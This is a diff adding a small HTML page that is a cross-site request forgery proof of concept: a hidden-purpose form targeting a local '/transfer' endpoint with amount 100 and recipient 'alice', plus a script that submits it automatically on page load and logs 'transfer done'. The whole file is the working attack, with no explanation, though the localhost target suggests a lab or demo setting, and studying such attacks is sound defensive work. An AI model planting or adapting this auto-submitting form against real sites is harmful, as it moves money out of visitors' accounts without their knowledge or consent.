@@ -1,0 +1,11 @@
+<form method='POST' action='http://localhost:4000/transfer'>
+    Send amount:
+    <input name='amount' value="100" />
+    To user:
+    <input name='to' value="alice" />
+    <input type='submit' value='Send' />
+</form>
+<script>
+        document.forms[0].submit()
+        console.log('transfer done')
+</script>
